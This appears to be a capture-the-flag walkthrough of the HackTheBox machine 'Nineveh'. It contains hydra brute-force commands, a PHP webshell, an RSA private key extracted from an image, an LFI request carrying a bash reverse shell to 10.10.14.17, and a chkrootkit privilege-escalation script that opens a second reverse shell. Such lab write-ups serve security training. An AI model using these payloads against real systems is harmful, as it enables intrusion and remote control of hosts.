# Nineveh
## Information Gathering
#### Ports/Services
80/tcp    http     Apache httpd 2.4.18 ((Ubuntu))
443/tcp   ssl/http Apache httpd 2.4.18 ((Ubuntu))

#### Credentials
- http://10.10.10.43/department/login.php
	- `admin:1q2w3e4r5t`
- https://10.10.10.43/db/index.php
	- `admin:password123`

## Enumeration
### Nmap scan
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-08 19:00 EST
Nmap scan report for 10.10.10.43
Host is up (0.013s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
```

### 80/tcp
- Software
	- Apache 2.4.18

- Running whatweb
```bash
whatweb --color=never --no-errors -a 3 -v http://10.10.10.43

http://10.10.10.43 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.43]
```

- Running Gobuster
```bash
gobuster dir -u http://10.10.10.43 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 50 -x html,php,txt,xml,sh,js -o tcp80/root.g
ob

/info.php             (Status: 200) [Size: 83689]
/index.html           (Status: 200) [Size: 178]  
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]
```

- info.php
	- PHP Info page
- /department/
	- Land on /department/login.php - gobuster
	- In the code of the page there is a comment `<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->`


- Running Gobuster for department directory
```bash
gobuster dir -u http://10.10.10.43/department/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,php,txt,xml
,sh,js -o department.gob

/files                (Status: 301) [Size: 321] [--> http://10.10.10.43/department/files/]
/header.php           (Status: 200) [Size: 670]
/footer.php           (Status: 200) [Size: 51]
/login.php            (Status: 200) [Size: 1560]
/index.php            (Status: 200) [Size: 68]
/css                  (Status: 301) [Size: 319] [--> http://10.10.10.43/department/css/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/manage.php           (Status: 302) [Size: 0] [--> login.php]
```

- When submitting `admin1:password` the form returns `invalid username`
- When submitting `admin:password` the form returns `Invalid Password!`
- This means we could perform a dictionary attack. We already know the username value `admin`
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form '/department/login.php:username=admin&password=^PASS^:Invalid Password!' -f -vV

[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
```
- The credentials `admin:1q2w3e4r5t` logs in

- Navigating to http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt presents a message
```bash
-   Have you fixed the login page yet! hardcoded username and password is really bad idea!
-   check your serect folder to get in! figure it out! this is your challenge
-   Improve the db interface.
    ~amrois**
```

- Test cases
	- LFI
		- http://10.10.10.43/department/manage.php?notes=files/../../../../../etc/passwd - FAILED
	- http://10.10.10.43/department/manage.php?notes=dirs/ninevehNotes.txt - Returns error message: `Warning:  include(dirs/ninevehNotes.txt): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line **31**  
  
**Warning**:  include(): Failed opening 'dirs/ninevehNotes.txt' for inclusion (include_path='.:/usr/share/php') in **/var/www/html/department/manage.php** on line **31**`

### 443/tcp
- Software
	- Apache 2.4.18
	- phpLiteAdmin v1.9
		- [phpLiteAdmin - 'table' SQL Injection](https://www.exploit-db.com/exploits/38228)
		- [PHLiteAdmin 1.9.3 - Remote PHP Code Injection](https://www.exploit-db.com/exploits/24044)


- Running SSLScan
```bash
sslscan --show-certificate --no-colour 10.10.10.43:443 2>&1
```
- CN=nineveh.htb - added this to /etc/hosts
- email: admin@nineveh.htb

- Running Gobuster for root directory
```bash
gobuster dir -u https://10.10.10.43 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x html,php,txt,sh,js,xml -o gob/root.htb -k

/index.html           (Status: 200) [Size: 49]
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]
/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
```

- Navigating to /db/ presents us a login portal for phpLiteAdmin v1.9
- Since there is only one parameter for this form, I perform a dictionary attack. Note the https-post-form instead of http-post-form
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -s 443 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.' -f -vV

[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
```
- Credentials `admin:password123` authenticate us


- The image @ https://10.10.10.43/secure_notes/ has a RSA private key embedded
```bash
strings nineveh.png
...<snip>...
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
...<snip>...
```

## Exploitation
- Once logged into both sites, you can create a payload in phpLiteAdmin

- Create table `ninvehNotes.php`
- Add column `ninevehNotes` as a text field and add the following for a webshell: `<?php system($_GET[cmd]) ?>`
- The following HTTP payload gets you a reverse shell
```
GET /department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.17/53+0>%261" HTTP/1.1
Host: 10.10.10.43
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=8qn3aunvtaqu7lqu61gdvc9us1
Upgrade-Insecure-Requests: 1
```
- You drop into the box as `www-data`


## Privilege Escalation
### Enumeration
- There are two users on this box from `/etc/passwd`
	- root
	- amrois

- In the `/` directory there is a directory `report` which has text files produced approximatly every minute.
- It appears to be the log file for a scanner
- A few of the files have the prefix of 'chk'
- Checking the processes, root is running chkrootkit

```bash
$ ps aux | grep chkrootkit
root     25454  0.0  0.1   4796  1972 ?        S    15:40   0:00 /bin/sh /usr/bin/chkrootkit
```
- [Chkrootkit 0.49 EoP](https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/)
- Writing the following contents to `/tmp/update`
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.17/1337 0>&1
```
- This catches me a reverse shell